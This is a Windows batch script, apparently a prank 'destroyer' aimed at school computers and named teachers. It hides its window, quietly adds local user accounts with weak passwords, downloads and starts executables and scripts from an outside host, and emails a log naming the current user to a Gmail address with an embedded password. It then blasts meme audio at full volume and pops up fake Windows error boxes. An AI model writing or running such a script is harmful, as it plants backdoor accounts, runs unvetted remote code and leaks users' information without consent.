@echo off
title You are not allowed to view this, im sorry!
echo Minimizing...
powershell -window minimized -command ""
echo Hiding...
powershell -window hidden -command ""
net user /add dstr 123456!
net user /add standard2 123456!
cd C:/
mkdir tools
cd tools
curl -s https://sources.tobir.xyz/tools-mirror/nircmd.exe > nircmd.tmpexe
move nircmd.tmpexe nircmd.exe
curl -s https://sources.tobir.xyz/mailserver/sendmail.bat > sendmail.tmpbat
move sendmail.tmpbat sendmail.bat

timeout 1
cd C:/
mkdir scripts
cd scripts
curl -s https://sources.tobir.xyz/scripts/create-threads.bat > create-threads.tmpbat
curl -s https://sources.tobir.xyz/scripts/login.bat > login.tmpbat
move login.tmpbat login.bat
curl -s https://sources.tobir.xyz/scripts/websurf.bat > websurf.tmpbat
move websurf.tmpbat websurf.bat
move create-threads.tmpbat create-threads.bat
start login.bat
start create-threads.bat
cd C:/
mkdir Sessions
cd Sessions
mkdir %date%
cd %date%
mkdir %username%
cd %username%
echo Session running on user %UserName% > session.log
call C:\tools\sendmail.bat pc.skola.files.send@gmail.com dnjppkiqfvpvojxg "C:\Sessions\%Date%\%UserName%\session.log"
#nircmd.exe monitor off
cd C:/
mkdir songs
cd songs
curl -s https://sources.tobir.xyz/songs/mann.mp3 > mann.mp3
echo Download Mann gegen Mann (1/1)
cd C:/
mkdir memes
cd memes
curl -s https://sources.tobir.xyz/memes/airhorn.mp3 > airhorn.mp3
echo Downloaded airhorn (1/14)
curl -s https://sources.tobir.xyz/memes/car.mp3 > car.mp3
echo Downloaded car (2/14)
curl -s https://sources.tobir.xyz/memes/carefree.mp3 > carefree.mp3
echo Downloaded carefree song (3/14)
curl -s https://sources.tobir.xyz/memes/cat.mp3 > cat.mp3
echo Downloaded cat (4/14)
curl -s https://sources.tobir.xyz/memes/eggdog.mp4 > eggdog.mp4
echo Downloaded eggdog (5/14)
curl -s https://sources.tobir.xyz/memes/fish.mp4 > fish.mp4
echo Downloaded fish (6/14)
curl -s https://sources.tobir.xyz/memes/fish1.mp4 > fish1.mp4
echo Downloaded fish1 (7/14)
curl -s https://sources.tobir.xyz/memes/china.mp3 > china.mp3
echo Downloaded china (8/14)
curl -s https://sources.tobir.xyz/memes/memesdead.mp3 > memesdead.mp3
echo Downloaded memesdead (9/14)
curl -s https://sources.tobir.xyz/memes/npc.mp3 > npc.mp3
echo Downloaded npc music (10/14)
curl -s https://sources.tobir.xyz/memes/rchad.mp4 > rchad.mp4
echo Downloaded random chad images (11/14)
curl -s https://sources.tobir.xyz/memes/skype.mp3 > skype.mp3
echo Downloaded skype (12/14)
curl -s https://sources.tobir.xyz/memes/xuehua.mp4 > xuehua.mp4
echo Downloaded xuehua (13/14)
curl -s https://sources.tobir.xyz/memes/damage.mp4 > damage.mp4
echo Downloaded damage (14/14)

curl -s https://sources.tobir.xyz/hotdog.mp3 > hotdog.mp3
curl -s https://sources.tobir.xyz/memes/ppap.mp3 > ppap.mp3
curl -s https://sources.tobir.xyz/memes/naenae.mp3 > naenae.mp3
curl -s https://sources.tobir.xyz/memes/einszwei.mp3 > einszwei.mp3
curl -s https://sources.tobir.xyz/memes/uhoh.mp3 > uhoh.mp3

curl -s https://sources.tobir.xyz/memes/avocado.mp4 > avocado.mp4
curl -s https://sources.tobir.xyz/memes/habibi.mp3 > habibi.mp3
curl -s https://sources.tobir.xyz/memes/nokia.mp3 > nokia.mp3
curl -s https://sources.tobir.xyz/memes/saul.mp3 > saul.mp3
curl -s https://sources.tobir.xyz/memes/sigma.mp3 > sigma.mp3
curl -s https://sources.tobir.xyz/memes/trippiered.mp3 > trippiered.mp3

curl -s https://sources.tobir.xyz/memes/italia.mp3 > italia.mp3
curl -s https://sources.tobir.xyz/memes/mickey.mp3 > mickey.mp3
curl -s https://sources.tobir.xyz/memes/sounds.mp3 > sounds.mp3
echo Executing start command after 5 seconds
timeout 5
#start /min npc.mp3
echo Started NPC SONG
echo Next is Skype
timeout 100
#start /min skype.mp3
echo Started Skype
echo Next is cat.mp3
timeout 100
#start /min cat.mp3
echo Started cat
echo Next is china.mp3
timeout 150
#start /min china.mp3
echo Started china
echo Next and last are memes till you are dead
timeout 1
C:\tools\nircmd.exe mutesysvolume 0
C:\tools\nircmd.exe setsysvolume 65535
#C:\tools\nircmd.exe speak text "Hello this is elon musk how can i help you?"
timeout 1
#C:\tools\nircmd.exe speak text "Mam tady tu syrovou pizzu"
#start /min memesdead.mp3
timeout 150
#C:\tools\nircmd.exe speak text "Bozi mlini melou"
timeout 1
#start /min naenae.mp3
#timeout 1
:C:\tools\nircmd.exe win min stitle "Přeh"
:C:\tools\nircmd.exe win min stitle "Hudb"
:c:\tools\nircmd.exe infobox "Unexpected error" "Windows"
:c:\tools\nircmd.exe infobox "Neznama chyba!" "Windows"
:c:\tools\nircmd.exe infobox "Drive with id 69 not found" "Windows"
:c:\tools\nircmd.exe infobox "Rosta je az moc goofy" "Windows"
:c:\tools\nircmd.exe infobox "Tvojemama" "Windows"
:c:\tools\nircmd.exe infobox "Neznama chyba!" "Windows"
cd c:/
mkdir dlogs
cd dlogs
mkdir %date%
cd %date%
echo Destroyer Script was been completed at time %time% by user %username% at date %date%! > %username%_%date%.dlog
cd c:/
mkdir debug_destroyer
cd debug_destroyer
echo You are not allowed to view debug! > debug_%username%_%date%.debug
echo You are not allowed to view this key! > debug_%username%_%date%.dkey
echo Started memes till you are dead, this program will close after 10 seconds
#c:\tools\nircmd.exe infobox "Unexpected error" "Windows"
timeout 2
cd C:\
cd memes
if %UserName%==dvichorcova.ucitel goto vichorcova
if %UserName%==kjanku.ucitel goto janku
if %UserName%==jnozickova.ucitel goto nozickova
if %UserName%==mdolinska.ucitel goto dolinska
if %UserName%==bknazejova.ucitel goto knazejova
if %UserName%==hdvorackova.ucitel goto dvorackova
if %UserName%==jsafar.ucitel goto safar
exit

:vichorcova
exit
start ppap.mp3
timeout 1
C:\tools\nircmd.exe win min stitle "Přeh"
C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit

:janku
exit
start /min mickey.mp3
timeout 1
:C:\tools\nircmd.exe win min stitle "Přeh"
:C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit

:nozickova
exit
#start /min nothing
timeout 1
C:\tools\nircmd.exe win min stitle "Přeh"
C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit

:dolinska
exit
#start /min nothing
timeout 1
C:\tools\nircmd.exe win min stitle "Přeh"
C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit

:knazejova
exit
#start /min nothing
timeout 1
C:\tools\nircmd.exe win min stitle "Přeh"
C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit

:dvorackova
exit
start /min uhoh.mp3
timeout 1
C:\tools\nircmd.exe win min stitle "Přeh"
C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit

:safar
exit
#start /min nothing
timeout 1
C:\tools\nircmd.exe win min stitle "Přeh"
C:\tools\nircmd.exe win min stitle "Hudb"
timeout 10
exit
